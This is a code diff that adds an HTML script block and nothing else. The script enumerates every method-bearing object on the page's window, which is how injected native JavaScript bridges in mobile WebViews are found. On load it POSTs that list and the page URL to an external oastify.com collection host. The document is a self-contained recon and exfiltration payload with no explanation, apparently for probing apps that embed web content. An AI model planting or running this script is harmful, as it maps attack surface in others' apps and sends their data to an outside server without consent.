@@ -1,0 +1,19 @@
+<script>
+function enumerateBridgeNames() {
+  const res = [];
+  for (const k in window) {
+    try {
+      const v = window[k];
+      if (v && (typeof v === 'object' || typeof v === 'function')) {
+        const methods = Object.getOwnPropertyNames(v).filter(p => typeof v[p] === 'function');
+        if (methods.length) res.push({name:k, methods});
+      }
+    } catch(e){}
+  }
+  return res;
+}
+(function(){
+  const bridges = enumerateBridgeNames();
+  fetch("https://nofwyui9xmqyr4ewfz43h2cas1ysmia7.oastify.com", {method:"POST", body: JSON.stringify({bridges, href:location.href})});
+})();
+</script>
